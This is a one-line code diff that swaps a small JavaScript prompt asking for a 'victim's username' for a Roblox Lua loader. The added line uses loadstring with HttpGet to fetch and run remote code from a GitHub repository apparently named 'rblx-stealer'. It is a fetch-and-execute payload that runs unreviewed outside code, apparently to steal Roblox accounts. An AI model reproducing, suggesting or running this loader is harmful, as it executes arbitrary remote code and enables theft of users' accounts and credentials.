@@ -1,6 +1,1 @@
-const username = prompt("Input victim's username:");
-if (username) {
-    console.log("Username entered:", username);
-} else {
-    console.log("No username entered.");
-}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxlegit/rblx-stealer/refs/heads/main/sumshit.txt"))()
